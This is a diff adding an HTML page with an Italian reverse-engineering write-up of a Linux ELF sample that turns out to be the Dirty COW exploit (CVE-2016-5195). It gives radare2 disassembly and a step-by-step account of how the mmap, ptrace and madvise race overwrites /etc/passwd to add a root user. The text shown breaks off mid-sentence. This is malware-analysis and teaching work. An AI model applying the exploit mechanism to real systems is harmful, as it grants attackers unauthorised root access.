@@ -1,0 +1,1040 @@
+<html>
+<head>
+<title>Spaghetti Hacker</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #00FFFF;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #00FFFF; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+Dirty Cow
+~ hcf  
+
+;questo report documenta il reverse engineering di un eseguibile ELF a 64 bit
+non "stripped", cioè con informazioni sui simboli. L'analisi è stata condotta
+utilizzando sia tecniche statiche che dinamiche per identificare le
+funzionalità del programma e il suo comportamento, con l'obiettivo di
+determinare la sua potenziale natura malevola. In genere scelgo a caso un
+eseguibile ELF, prendendolo dalla mia collezione di malware Linux e inizio ad
+analizzarlo non sapendo assolutamente nulla di quelle che possano essere le sue
+caratteristiche. Utilizzo vari strumenti automatici per semplificare l'analisi
+nelle fasi iniziali; analisi che si basa prevalentemente sul reverse
+engineering del codice assembly disassemblato.
+
+;ho comprato uno strumento automatico per aiutarmi nel lavoro. Ora ho bisogno
+di un strumento automatico per aiutarmi con lo strumento automatico!
+
+;md5 3871cfbee9b6fab4d7cf65cd18a1353a
+;sha1 52e8d2e4fe038698879a9dc13d7324e575266b27
+;sha256 0b22cdc1b1b1f944e4ca8fced2e234d14aeeef830970e8ae7491cbdcb3e11460
+;os linux format elf arch amd64
+
+------------------------------------------------------------------------------
+
+;strumenti utilizzati:
+
+;analisi statica:
+
+;file: per identificare le caratteristiche generali del binario.
+;strings: per estrarre stringhe di testo che possono fornire indizi su IP, nomi
+di file, e comandi.
+;radare2: per disassemblare e analizzare il flusso del programma.
+;capa: per identificare caratteristiche comuni di malware basate su pattern
+predefiniti.
+
+;analisi dinamica:
+
+;sysdig: per monitorare le chiamate di sistema effettuate dal malware.
+;remnux sandbox: per isolare l'eseguibile e prevenire potenziali danni durante
+l'analisi dinamica che comporta l'esecuzione del malware.
+
+;l'obiettivo dell'analisi è quello di comprendere le attività malevole del
+binario, determinando eventuali indicatori di compromissione (IoC), come
+indirizzi IP, domini contattati, file manipolati, e chiamate di sistema
+potenzialmente sospette.
+
+------------------------------------------------------------------------------
+
+file 0b22cdc1b1b1f944e4ca8fced2e234d14aeeef830970e8ae7491cbdcb3e11460
+0b22cdc1b1b1f944e4ca8fced2e234d14aeeef830970e8ae7491cbdcb3e11460: ELF 64-bit
+LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter
+/lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
+BuildID[sha1]=db09cac6418380052fd3e58b6df193651aa82a0b, not stripped
+
+;si tratta di un file binario in formato ELF 64-bit; un eseguibile per
+architettura x86-64 su sistemi Linux; non è "stripped", quindi include anche
+informazioni sui simboli (nomi di funzioni, variabili, ecc.), il che può essere
+utile durante l'analisi statica.
+
+;le mucche non hanno mai fretta. Hanno sempre tempo per 'ruminare' sulle loro
+decisioni!
+
+------------------------------------------------------------------------------
+
+[0x00400b30]> iz
+[Strings]
+nth paddr vaddr len size section type string
+0 0x00001230 0x00401230 11 12 .rodata ascii /etc/passwd
+1 0x0000123c 0x0040123c 15 16 .rodata ascii /tmp/passwd.bak
+2 0x0000124c 0x0040124c 4 5 .rodata ascii root
+3 0x00001251 0x00401251 21 22 .rodata ascii %s:%s:%d:%d:%s:%s:%s\n
+4 0x00001267 0x00401267 12 13 .rodata ascii madvise %d\n\n
+5 0x00001278 0x00401278 55 56 .rodata ascii File %s already exists! Please
+delete it and run again\n
+6 0x000012b8 0x004012b8 32 33 .rodata ascii %s successfully backed up to %s\n
+7 0x000012d9 0x004012d9 5 6 .rodata ascii /root
+8 0x000012df 0x004012df 9 10 .rodata ascii /bin/bash
+9 0x000012f0 0x004012f0 34 35 .rodata ascii Please enter the new password: %s\n
+10 0x00001318 0x00401318 31 32 .rodata ascii Please enter the new password:
+11 0x00001338 0x00401338 18 19 .rodata ascii Complete line:\n%s\n
+12 0x0000134b 0x0040134b 10 11 .rodata ascii mmap: %lx\n
+13 0x00001356 0x00401356 10 11 .rodata ascii ptrace %d\n
+14 0x00001368 0x00401368 51 52 .rodata ascii Done! Check %s to see if the new
+user was created.\n
+15 0x000013a0 0x004013a0 62 63 .rodata ascii You can log in with the username
+'%s' and the password '%s'.\n\n
+16 0x000013e0 0x004013e0 37 38 .rodata ascii \nDON'T FORGET TO RESTORE! $ mv %s
+%s\n
+
+;stringhe sospette:
+
+;/etc/passwd (offset 0x00401230): Questa è la posizione del file di sistema che
+contiene informazioni sugli account utente. Il fatto che il binario faccia
+riferimento a questo file può indicare che cerca di leggere o modificare i dati
+degli account utente, un comportamento comune in malware che tentano di
+acquisire il controllo del sistema o compromettere account privilegiati.
+
+;/tmp/passwd.bak (offset 0x0040123c): La presenza di un backup del file
+/etc/passwd nella directory /tmp è sospetta. Un malware potrebbe creare una
+copia di questo file per modificarlo e poi ripristinarlo, mascherando i
+cambiamenti.
+
+;root (offset 0x0040124c): Il riferimento diretto all'utente "root" può
+indicare che il malware cerca di ottenere o sfruttare privilegi di
+amministrazione, ad esempio modificando account o eseguendo comandi con
+permessi elevati.
+
+;/root (offset 0x004012d9): La directory /root è la home directory dell'utente
+amministratore (root). Un accesso a questa directory senza autorizzazione è un
+chiaro segnale di attività malevola, poiché solo utenti con privilegi di
+amministratore dovrebbero interagire con essa.
+
+;/bin/bash (offset 0x004012df): Il riferimento alla shell di sistema può
+suggerire che il binario esegua comandi di sistema o tenti di aprire una shell
+per eseguire operazioni arbitrarie, che è spesso un comportamento utilizzato
+dai malware per garantire persistenza o controllo remoto.
+
+;Please enter the new password: %s\n (offset 0x004012f0): Stringhe che
+richiedono una nuova password sono insolite, a meno che non facciano parte di
+un programma legittimo per la gestione delle password. In un malware, questa
+stringa potrebbe indicare che si sta tentando di alterare le password degli
+utenti o creare nuovi account compromessi.
+
+;Done! Check %s to see if the new user was created. (offset 0x00401368): Questa
+stringa è molto sospetta, poiché indica chiaramente che il malware potrebbe
+tentare di creare un nuovo utente nel sistema. Creare account aggiuntivi è una
+tecnica comune per garantire persistenza su un sistema compromesso.
+
+;You can log in with the username '%s' and the password '%s'. (offset
+0x004013a0): La creazione di nuove credenziali di accesso è un comportamento
+allarmante, suggerendo che il malware potrebbe voler creare un accesso
+persistente per un attaccante.
+
+;DON'T FORGET TO RESTORE! $ mv %s %s (offset 0x004013e0): Questa stringa
+potrebbe indicare che il malware modifica file critici, ma prevede di
+ripristinare lo stato originale dopo la compromissione, per evitare di destare
+sospetti.
+
+;c'è qualcosa di sospetto qui. La mia mucca ha smesso di dare latte e ora
+trascorre le sue giornate a leggere 'La fattoria degli animali' di George
+Orwell!
+
+[0x00400e59]> pdf
+; DATA XREF from entry0 @ 0x400b4d(r)
+ain (signed int64_t argc, char **argv);
+; arg signed int64_t argc @ rdi
+; arg char **argv @ rsi
+; var char *var_8h @ rbp-0x8
+; var signed int64_t var_ch @ rbp-0xc
+; var signed int64_t var_bp_10h @ rbp-0x10
+; var pid_t *pid @ rbp-0x14
+; var int64_t var_bp_18h @ rbp-0x18
+; var uint32_t status @ rbp-0x1c
+; var char *s @ rbp-0x28
+; var size_t var_2ch @ rbp-0x2c
+; var char *var_38h @ rbp-0x38
+; var char *var_40h @ rbp-0x40
+; var char *var_48h @ rbp-0x48
+; var int64_t var_4ch @ rbp-0x4c
+; var int64_t var_50h @ rbp-0x50
+; var int64_t var_58h @ rbp-0x58
+; var char *var_60h @ rbp-0x60
+; var signed int64_t var_64h @ rbp-0x64
+; var char **var_70h @ rbp-0x70
+; var int64_t var_sp_8h @ rsp+0x8
+; var int64_t var_10h @ rsp+0x10
+; var char *var_18h @ rsp+0x18
+; var char *var_20h @ rsp+0x20
+; var char *var_28h @ rsp+0x28
+
+0x00400e59 push rbp
+0x00400e5a mov rbp, rsp
+0x00400e5d sub rsp, 0xa0
+0x00400e64 mov dword [var_64h], edi ; argc
+0x00400e67 mov qword [var_70h], rsi ; argv
+0x00400e6b mov rdx, qword [obj.backup_filename] ; [0x6020f8:8]=0x40123c
+str._tmp_passwd.bak ; "<\x12@"
+0x00400e72 mov rax, qword [obj.filename] ; [0x6020f0:8]=0x401230
+str._etc_passwd ; "0\x12@"
+0x00400e79 mov rsi, rdx ; int64_t arg2
+0x00400e7c mov rdi, rax ; int64_t arg1
+0x00400e7f call sym.copy_file
+
+;in questa fase iniziale, il malware procede a fare una copia del file
+/etc/passwd, copiandolo in /tmp/passwd.bak.
+
+0x00400e84 mov dword [status], eax
+0x00400e87 cmp dword [status], 0
+0x00400e8b je 0x400e97
+
+;se va a buon fine la copia del file /etc/passwd il malware procede, altrimenti
+esce.
+;e mi chiedo dove possa andare con questo freddo.
+
+0x00400e8d mov eax, dword [status]
+0x00400e90 mov edi, eax ; int status
+0x00400e92 call sym.imp.exit ; void exit(int status)
+
+0x00400e97 mov qword [var_60h], str.root ; 0x40124c ; "root"
+0x00400e9f mov dword [var_50h], 0
+0x00400ea6 mov dword [var_4ch], 0
+0x00400ead mov qword [var_48h], str.root ; 0x40124c ; "root"
+0x00400eb5 mov qword [var_40h], str._root ; 0x4012d9 ; "/root"
+0x00400ebd mov qword [var_38h], str._bin_bash ; 0x4012df ; "/bin/bash"
+
+;inizializzazione di diverse variabili locali; alcune vengono valorizzate con
+le stringhe sospette che sono state evidenziate precedentemente.
+
+0x00400ec5 cmp dword [var_64h], 1 ;(0x00400e64 mov dword [var_64h], edi ; argc)
+0x00400ec9 jle 0x400eef
+
+;il malware fa un controllo su argc: controlla se è minore o uguale a 1, se si
+salta al getpass; significa che la nuova password non è stata passata come
+parametro all'eseguibile; diversamente, la password passata all'eseguibile
+viene stampata con una chiamata alla funzione printf.
+
+;ho chiesto alla mia mucca come si sentiva, ha detto: "Non posso lamentarmi, ma
+se fossi un po’ più in alto nella catena alimentare, sarebbe meglio!"
+
+0x00400ecb mov rax, qword [var_70h]
+0x00400ecf mov rax, qword [rax + 8]
+0x00400ed3 mov qword [var_8h], rax
+0x00400ed7 mov rax, qword [var_8h]
+0x00400edb mov rsi, rax
+0x00400ede mov edi, str.Please_enter_the_new_password:__s_n ; 0x4012f0 ;
+"Please enter the new password: %s\n" ; const
+0x00400ee3 mov eax, 0
+0x00400ee8 call sym.imp.printf ; int printf(const char *format)
+0x00400eed jmp 0x400efd
+
+0x00400eef mov edi, str.Please_enter_the_new_password:_ ; 0x401318 ; "Please
+enter the new password: "
+0x00400ef4 call sym.imp.getpass
+
+0x00400ef9 mov qword [var_8h], rax
+0x00400efd mov rax, qword [var_8h]
+0x00400f01 mov rdi, rax ; int64_t arg1
+0x00400f04 call sym.generate_password_hash
+
+;<unistd.h>: Include funzioni di sistema come getpass. Questa libreria contiene
+molte delle funzioni standard del sistema operativo Unix, come gestione dei
+file, processi e input/output.
+;<crypt.h>: Include funzioni per la crittografia delle password come crypt, che
+può essere utilizzata insieme a getpass per criptare una password inserita
+dall'utente.
+
+;la funzione crypt viene chiamata dalla funzione generate_password_hash; la
+funzione crypt è comunemente utilizzata per la gestione delle password,
+specialmente per la loro crittografia. Nel contesto di questo eseguibile, se la
+funzione generate_password_hash chiama crypt, possiamo dedurre che essa prende
+una nuova password come parametro e genera un hash, che potrebbe poi essere
+usato per un eventuale autenticazione malevola.
+
+;un hacker ha provato a entrare nel mio PC, ma ha trovato solo disegni di
+mucche mostruose. Gli ho detto: "Non ti preoccupare, non c'è nulla di
+compromettente qui, solo il mio gusto discutibile!".
+
+0x00400f09 mov qword [var_58h], rax
+0x00400f0d mov rax, qword [var_60h]
+0x00400f11 mov qword [rsp], rax
+0x00400f15 mov rax, qword [var_58h]
+0x00400f19 mov qword [var_sp_8h], rax
+0x00400f1e mov rax, qword [var_50h]
+0x00400f22 mov qword [var_10h], rax
+0x00400f27 mov rax, qword [var_48h]
+0x00400f2b mov qword [var_18h], rax
+0x00400f30 mov rax, qword [var_40h]
+0x00400f34 mov qword [var_20h], rax
+0x00400f39 mov rax, qword [var_38h]
+0x00400f3d mov qword [var_28h], rax
+0x00400f42 call sym.generate_passwd_line
+
+;la funzione sym.generate_passwd_line sembra essere progettata per creare una
+nuova linea nel file /etc/passwd, tipicamente associata a un utente, in questo
+caso root, con un hash di password crittografata. Questo tipo di comportamento
+è particolarmente sospetto perché potrebbe indicare che il malware stia
+cercando di creare o modificare le credenziali di un utente di sistema,
+potenzialmente con privilegi elevati.
+
+0x00400f47 mov qword [s], rax
+0x00400f4b mov rax, qword [s]
+0x00400f4f mov rsi, rax
+0x00400f52 mov edi, str.Complete_line:_n_s_n ; 0x401338 ; "Complete
+line:\n%s\n" ; const char *format
+0x00400f57 mov eax, 0
+0x00400f5c call sym.imp.printf ; int printf(const char *format)
+
+;la linea del file /etc/passwd viene poi stampata nello stdout.
+
+0x00400f61 mov rax, qword [obj.filename] ; [0x6020f0:8]=0x401230
+str._etc_passwd ; "0\x12@"
+0x00400f68 mov esi, 0 ; int oflag
+0x00400f6d mov rdi, rax ; const char *path
+0x00400f70 mov eax, 0
+0x00400f75 call sym.imp.open ; int open(const char *path, int oflag)
+
+;viene aperto il file delle password /etc/passwd.
+
+0x00400f7a mov dword [obj.f], eax ; [0x6021d0:4]=0
+0x00400f80 mov eax, dword [obj.f] ; [0x6021d0:4]=0
+0x00400f86 mov esi, obj.st ; 0x602140 ; void *buf
+0x00400f8b mov edi, eax ; int fildes
+0x00400f8d call sym.fstat ; int fstat(int fildes, void *buf)
+
+;La funzione fstat(int fildes, struct stat *buf) in C è utilizzata per ottenere
+informazioni su un file identificato dal descrittore di file (file descriptor)
+fildes. Le informazioni recuperate includono dettagli come dimensione del file,
+permessi, tipo di file, data di modifica, ecc.
+
+0x00400f92 mov edx, dword [obj.f] ; [0x6021d0:4]=0
+0x00400f98 mov rax, qword [0x00602170] ; [0x602170:8]=0
+0x00400f9f add rax, 8
+0x00400fa3 mov r9d, 0 ; size_t offset
+0x00400fa9 mov r8d, edx ; int fd
+0x00400fac mov ecx, 2 ; int flags
+0x00400fb1 mov edx, 1 ; int prot
+0x00400fb6 mov rsi, rax ; size_t length
+0x00400fb9 mov edi, 0 ; void*addr
+0x00400fbe call sym.imp.mmap ; void*mmap(void*addr, size_t length, int prot,
+int flags, int fd, size_t offset)
+
+;la funzione mmap può mappare un file in memoria basandosi sulla sua
+dimensione, che può essere ottenuta tramite fstat e il membro st_size della
+struttura stat.
+;aspetta! di che membro si sta parlando?!
+
+;viene chiamata la funzione di sistema mmap, con i registri che contengono i
+seguenti parametri:
+
+;edi = 0: Indirizzo suggerito per la mappatura (lasciato a 0, il kernel sceglie
+l'indirizzo).
+;rsi = rax: Lunghezza della mappatura (prelevata da rax dopo l'incremento di 8;
+in questo caso si tratta delle informazioni che sono state ottenute da fstat,
+che ritorna una struct stat; l'ottavo byte di questa struttura è proprio la
+dimensione del file che siamo andati ad analizzare).
+;edx = 1: Protezioni (PROT_READ).
+;ecx = 2: Flag (MAP_PRIVATE).
+;r8d = fd: File descriptor del file da mappare (prelevato da edx).
+;r9d = 0: Offset (inizia dal byte 0 del file).
+
+;il codice sta mappando un file in memoria utilizzando la funzione mmap. In
+particolare:
+
+;non specifica un indirizzo per la mappatura, quindi lascia che il sistema
+scelga.
+;la dimensione del file da mappare è quella contenuta nella struct stat
+ritornata da fstat.
+;la mappatura è impostata in modalità lettura (PROT_READ), probabilmente con il
+flag MAP_PRIVATE, il che significa che le modifiche fatte alla memoria mappata
+non verranno riflesse nel file originale.
+;utilizza il file descriptor memorizzato in obj.f per mappare il file.
+
+0x00400fc3 mov qword [obj.map], rax ; [0x6021d8:8]=0
+0x00400fca mov rax, qword [obj.map] ; [0x6021d8:8]=0
+0x00400fd1 mov rsi, rax
+0x00400fd4 mov edi, str.mmap:__lx_n ; 0x40134b ; "mmap: %lx\n" ; const char
+*format
+0x00400fd9 mov eax, 0
+0x00400fde call sym.imp.printf ; int printf(const char *format)
+
+;stampa l'indirizzo della regione di memoria dove è stato mappato il file
+/etc/passwd.
+
+0x00400fe3 call sym.imp.fork
+
+;forka il processo, creando un processo figlio.
+;quando ho sentito che stava per nascere il mio primo figlio, ho pensato: "Che
+bello, una piccola copia di me! Ora ho solo bisogno di una garanzia che non
+prenderà il mio senso dell'umorismo!"
+
+0x00400fe8 mov dword [obj.pid], eax ; [0x6021e8:4]=0
+0x00400fee mov eax, dword [obj.pid] ; [0x6021e8:4]=0
+0x00400ff4 test eax, eax
+0x00400ff6 je 0x4010d0
+
+;processo padre
+
+0x00400ffc mov eax, dword [obj.pid] ; [0x6021e8:4]=0
+0x00401002 mov edx, 0 ; int options
+0x00401007 mov esi, 0 ; int *wstatus
+0x0040100c mov edi, eax ; pid_t pid
+0x0040100e call sym.imp.waitpid ; pid_t waitpid(pid_t pid, int *wstatus, int
+options)
+
+;aspetta che il figlio sia terminato; Il processo padre chiama waitpid per
+attendere la terminazione del processo figlio. Questo è tipico nei programmi
+che usano fork, dove il padre attende che il figlio termini.
+;aspettare che mio figlio finisca in bagno è come attendere che una mucca inizi
+a volare.
+
+0x00401013 mov dword [var_bp_18h], 0
+0x0040101a mov rax, qword [s]
+0x0040101e mov rdi, rax ; const char *s
+0x00401021 call sym.imp.strlen ; size_t strlen(const char *s)
+
+;calcola la lunghezza della stringa relativa alla nuova linea del file
+/etc/passwd creata precedentemente.
+
+0x00401026 mov dword [var_2ch], eax
+0x00401029 mov dword [var_bp_10h], 0
+0x00401030 jmp 0x4010a8
+
+0x00401032 mov dword [pid], 0
+0x00401039 jmp 0x40109c
+
+0x0040103b mov dword [var_ch], 0
+0x00401042 jmp 0x40108f
+
+0x00401044 mov eax, dword [pid]
+0x00401047 movsxd rdx, eax
+0x0040104a mov rax, qword [s]
+0x0040104e add rax, rdx
+0x00401051 mov rdx, qword [rax]
+0x00401054 mov rcx, qword [obj.map] ; [0x6021d8:8]=0
+0x0040105b mov eax, dword [pid]
+0x0040105e cdqe
+0x00401060 lea rsi, [rcx + rax]
+0x00401064 mov eax, dword [obj.pid] ; [0x6021e8:4]=0
+0x0040106a mov rcx, rdx ; void*data
+0x0040106d mov rdx, rsi ; void*addr
+0x00401070 mov esi, eax ; pid_t pid
+0x00401072 mov edi, 4 ; l'opzione 4 corrisponde effettivamente a
+PTRACE_POKETEXT
+0x00401077 mov eax, 0
+0x0040107c call sym.imp.ptrace ; long ptrace(__ptrace_request request, pid_t
+pid, void*addr, void*data)
+
+;all'interno del ciclo più interno, la funzione ptrace viene chiamata con il
+comando PTRACE_POKETEXT, che scrive dati nella memoria del processo tracciato.
+
+0x00401081 mov edx, eax
+0x00401083 mov eax, dword [var_bp_18h]
+0x00401086 add eax, edx
+0x00401088 mov dword [var_bp_18h], eax
+0x0040108b add dword [var_ch], 1
+
+;ogni volta che ptrace scrive con successo, incrementa un contatore, che tiene
+traccia di quante operazioni di scrittura sono state effettuate.
+
+0x0040108f cmp dword [var_ch], 0x270f ; '\x0f\''
+0x00401096 jle 0x401044
+0x00401098 add dword [pid], 1
+
+0x0040109c mov eax, dword [pid]
+0x0040109f cmp eax, dword [var_2ch]
+0x004010a2 jl 0x40103b
+0x004010a4 add dword [var_bp_10h], 1
+
+0x004010a8 mov eax, 0x2710 ; '\x10\''
+0x004010ad cdq
+0x004010ae idiv dword [var_2ch]
+0x004010b1 cmp eax, dword [var_bp_10h]
+0x004010b4 jg 0x401032
+
+;esegue un numero di iterazioni proporzionale a 10.000 (0x2710) diviso la
+lunghezza della nuova linea del file /etc/passwd creata.
+
+0x004010ba mov eax, dword [var_bp_18h]
+0x004010bd mov esi, eax
+0x004010bf mov edi, str.ptrace__d_n ; 0x401356 ; "ptrace %d\n" ; const char
+*format
+0x004010c4 mov eax, 0
+0x004010c9 call sym.imp.printf ; int printf(const char *format)
+0x004010ce jmp 0x40111d
+
+;alla fine, viene stampato il numero totale di operazioni di scrittura
+effettuate nella memoria del processo tracciato.
+
+;il processo padre:
+
+;attende che il processo figlio termini usando waitpid.
+;esegue un ciclo in cui manipola la memoria del processo figlio con ptrace,
+scrivendo dati in aree specifiche.
+;accumula i risultati di queste operazioni e li stampa alla fine con printf.
+;questo comportamento è tipico di un attacco ptrace-based, dove il padre
+manipola la memoria del figlio per alterarne il comportamento o eseguire
+un'iniezione di codice.
+
+;obiettivo del codice: Questo codice sembra voler tracciare e manipolare un
+processo attraverso ptrace. Potrebbe essere parte di un malware che cerca di
+iniettare o modificare dati di autenticazione nel processo di login o in
+un'altra applicazione.
+
+;uso intensivo di ptrace: Il codice esegue molte operazioni di scrittura nel
+processo tracciato, il che può innescare un comportamento anomalo o portare a
+un crash del processo tracciato se la cosa non viene gestita correttamente.
+
+;comportamento potenzialmente malevolo: La natura del codice suggerisce che
+possa essere usato per aggirare la sicurezza o per inserire dati non
+autorizzati nella memoria di un altro processo.
+
+;il processo figlio
+;crea un thread che esegue la funzione madviseThread.
+;se essere un figlio modello significa ascoltare, allora credo che mio padre
+stia parlando con la mucca nel giardino!
+
+0x004010d0 mov ecx, 0
+0x004010d5 mov edx, sym.madviseThread ; 0x400d01
+0x004010da mov esi, 0
+0x004010df mov edi, obj.pth ; 0x6021e0
+0x004010e4 call sym.imp.pthread_create
+0x004010e9 mov edi, 0 ; __ptrace_request request
+0x004010ee mov eax, 0
+0x004010f3 call sym.imp.ptrace ; long ptrace(__ptrace_request request, pid_t
+pid, void*addr, void*data)
+0x004010f8 call sym.imp.getpid ; int getpid(void)
+0x004010fd mov esi, 0x13 ; 19 ; int sig
+0x00401102 mov edi, eax ; pid_t pid
+0x00401104 call sym.imp.kill ; int kill(pid_t pid, int sig)
+0x00401109 mov rax, qword [obj.pth] ; [0x6021e0:8]=0
+0x00401110 mov esi, 0
+0x00401115 mov rdi, rax
+0x00401118 call sym.imp.pthread_join
+
+;il processo figlio crea un thread che esegue la funzione madviseThread.
+;dopo aver creato il thread, il figlio richiede di essere tracciato dal
+processo padre con ptrace.
+;poi il figlio si sospende da solo usando kill(SIGSTOP) sul proprio PID.
+;infine, il processo figlio aspetta che il thread creato termini, utilizzando
+pthread_join.
+;questo schema sembra tipico di un malware o exploit che usa il thread separato
+per eseguire un'operazione (come modificare la memoria tramite madvise); mentre
+il processo principale si sospende e attende che il thread completi il suo
+compito.
+
+0x0040111d mov rax, qword [obj.filename] ; [0x6020f0:8]=0x401230
+str._etc_passwd ; "0\x12@"
+0x00401124 mov rsi, rax
+0x00401127 mov edi, str.Done__Check__s_to_see_if_the_new_user_was_created._n ;
+0x401368 ; "Done! Check %s to see if the created.\n" ; cot
+0x0040112c mov eax, 0
+0x00401131 call sym.imp.printf ; int printf(const char *format)
+0x00401136 mov rax, qword [var_60h]
+0x0040113a mov rdx, qword [var_8h]
+0x0040113e mov rsi, rax
+0x00401141 mov edi,
+str.You_can_log_in_with_the_username__s_and_the_password__s._n_n ; 0x4013a0 ;
+"You can log in with '%s' and the password '%s char *format
+0x00401146 mov eax, 0
+0x0040114b call sym.imp.printf ; int printf(const char *format)
+0x00401150 mov rdx, qword [obj.filename] ; [0x6020f0:8]=0x401230
+str._etc_passwd ; "0\x12@"
+0x00401157 mov rax, qword [obj.backup_filename] ; [0x6020f8:8]=0x40123c
+str._tmp_passwd.bak ; "<\x12@"
+0x0040115e mov rsi, rax
+0x00401161 mov edi, str._nDONT_FORGET_TO_RESTORE____mv__s__s_n ; 0x4013e0 ;
+"\nDON'T FORGET TO RESTORE! $ mv %s %s\n" ; format
+0x00401166 mov eax, 0
+0x0040116b call sym.imp.printf ; int printf(const char *format)
+0x00401170 mov eax, 0
+0x00401175 leave
+0x00401176 ret
+
+;sento una forte puzza di mucca. Qualcuno ha dimenticato di portare fuori la
+spazzatura... o ha portato dentro la mucca!
+
+------------------------------------------------------------------------------
+
+[0x00400e59]> s sym.madviseThread
+[0x00400d01]> pdf
+; DATA XREF from main @ 0x4010d5(r)
+dviseThread (int64_t arg1);
+; arg int64_t arg1 @ rdi
+; var signed int64_t var_4h @ rbp-0x4
+; var int64_t var_8h @ rbp-0x8
+; var int64_t var_18h @ rbp-0x18
+0x00400d01 push rbp
+0x00400d02 mov rbp, rsp
+0x00400d05 sub rsp, 0x20
+0x00400d09 mov qword [var_18h], rdi ; arg1
+0x00400d0d mov dword [var_8h], 0
+0x00400d14 mov dword [var_4h], 0
+0x00400d1b jmp 0x400d3d
+0x00400d1d mov rax, qword [obj.map] ; [0x6021d8:8]=0
+0x00400d24 mov edx, 4
+0x00400d29 mov esi, 0x64 ; 'd' ; 100
+0x00400d2e mov rdi, rax
+0x00400d31 call sym.imp.madvise
+0x00400d36 add dword [var_8h], eax
+0x00400d39 add dword [var_4h], 1
+0x00400d3d cmp dword [var_4h], 0xbebc1ff
+0x00400d44 jle 0x400d1d
+0x00400d46 mov eax, dword [var_8h]
+0x00400d49 mov esi, eax
+0x00400d4b mov edi, str.madvise__d_n_n ; 0x401267 ; "madvise %d\n\n" ; const
+char *format
+0x00400d50 mov eax, 0
+0x00400d55 call sym.imp.printf ; int printf(const char *format)
+0x00400d5a leave
+0x00400d5b ret
+
+;in ogni iterazione, viene effettuata una chiamata alla funzione madvise con i
+seguenti parametri:
+
+;rdi: puntatore alla memoria mappata (obj.map), passato come primo argomento
+alla madvise.
+;esi: 100 (che rappresenta probabilmente la lunghezza della memoria).
+;edx: 4, potrebbe essere il flag MADV_DONTNEED, che suggerisce al kernel di
+liberare le pagine di memoria poiché non saranno più necessarie.
+;questo comportamento potrebbe essere usato per manipolare la gestione della
+memoria da parte del kernel, probabilmente per un fine malevolo o exploit come
+il Dirty COW, dove madvise viene utilizzato per corrompere le pagine di
+memoria.
+
+;questa funzione esegue cicli 200000000 (0xbebc1ff +1 perchè i parte da 0)
+ripetuti su una regione di memoria invocando madvise con il flag MADV_DONTNEED.
+Potrebbe essere usato per influenzare la gestione della memoria e potrebbe
+essere parte di un attacco di corruzione della memoria, come il noto exploit
+Dirty COW, in cui madvise viene sfruttato per alterare la memoria condivisa.
+
+[0x00400d01]> s sym.imp.madvise
+[0x00400a90]> pdf
+┌ 6: sym.imp.madvise ();
+│ rg: 0 (vars 0, args 0)
+│ bp: 0 (vars 0, args 0)
+│ sp: 0 (vars 0, args 0)
+0x00400a90 jmp qword [reloc.madvise] ; [0x602098:8]=0x400a96
+
+;la funzione madvise viene utilizzata per fornire consigli al kernel riguardo
+l'utilizzo della memoria. In particolare, consente di indicare come il kernel
+dovrebbe trattare una particolare regione di memoria a partire da un
+determinato indirizzo (addr), per una lunghezza specificata (length).
+
+------------------------------------------------------------------------------
+
+;la funzione main del malware esegue i seguenti passaggi principali:
+
+;copia del file /etc/passwd: La prima operazione del malware è copiare il file
+/etc/passwd in un file di backup, probabilmente per poterlo ripristinare in
+seguito.
+
+;inserimento di una nuova password: Il malware chiede all'utente di inserire
+una nuova password. Se ci sono argomenti di input, li usa per formattare la
+richiesta di inserimento. Questa password viene successivamente trasformata in
+un hash tramite una funzione chiamata generate_password_hash.
+
+;generazione di una nuova riga per /etc/passwd: Con l'username "root" e la
+password hashata, il malware crea una nuova riga che rappresenta un nuovo
+utente da aggiungere al file /etc/passwd.
+
+;modifica del file /etc/passwd: Il malware apre il file /etc/passwd e utilizza
+mmap per mappare il contenuto in memoria. Successivamente, esegue una serie di
+operazioni per sovrascrivere i dati mappati con la nuova riga generata,
+utilizzando ptrace per manipolare il contenuto del file.
+
+;creazione di un thread per madvise: Il malware crea un thread che esegue la
+funzione madviseThread, la quale ripetutamente invoca madvise su una porzione
+della memoria mappata. Questa operazione è probabilmente utilizzata per
+invalidare la cache della memoria, permettendo la sovrascrittura del contenuto
+del file senza che il sistema lo rilevi.
+
+;sfruttamento di ptrace e attacco Dirty COW: Utilizzando ptrace, il malware
+ripetutamente modifica il contenuto del file /etc/passwd mappato in memoria,
+eseguendo un attacco noto come Dirty COW (Copy-On-Write), sfruttando una
+vulnerabilità che permette di modificare un file di sola lettura tramite
+l'alterazione della memoria.
+
+;pulizia finale: Dopo aver modificato il file, il malware termina il thread
+madvise e informa l'utente che il nuovo utente è stato creato con successo.
+Infine, ricorda all'utente di ripristinare il file di backup originale per
+nascondere l'attacco.
+
+;in sintesi, questo malware modifica il file /etc/passwd per aggiungere un
+utente con privilegi di root, utilizzando una combinazione di tecniche di
+memoria avanzate e sfruttamento di vulnerabilità (come Dirty COW) per bypassare
+le normali protezioni del sistema.
+
+------------------------------------------------------------------------------
+
+;l'attacco Dirty COW (CVE-2016-5195) sfrutta una vulnerabilità nel meccanismo
+Copy-On-Write (COW) nel kernel Linux. È uno dei bug di sicurezza più gravi mai
+scoperti nel kernel, in quanto consente a un utente locale (anche con privilegi
+limitati) di ottenere accesso in scrittura a file di sola lettura, compresi
+quelli critici come /etc/passwd. Vediamo nel dettaglio come funziona.
+
+;il COW è una tecnica di ottimizzazione utilizzata dai sistemi operativi per
+risparmiare memoria quando più processi condividono gli stessi dati. Quando un
+processo legge una pagina di memoria, il sistema può permettere la condivisione
+tra processi, mantenendo un'unica copia in memoria. Se uno dei processi prova a
+modificare questi dati, invece di modificare direttamente la memoria condivisa,
+il sistema operativo crea una copia privata della pagina solo per quel
+processo. Questa tecnica riduce l'uso della memoria e aumenta l'efficienza.
+
+;la vulnerabilità Dirty COW risiede in una race condition (condizione di
+competizione) nel processo di gestione della memoria durante un'operazione di
+COW. In breve, consente a un processo di forzare la scrittura su una pagina di
+memoria che dovrebbe essere solo in lettura.
+
+;l'attacco si basa sull'interazione tra tre funzioni principali:
+
+;mmap: Il file di sola lettura (ad esempio, /etc/passwd) viene mappato in
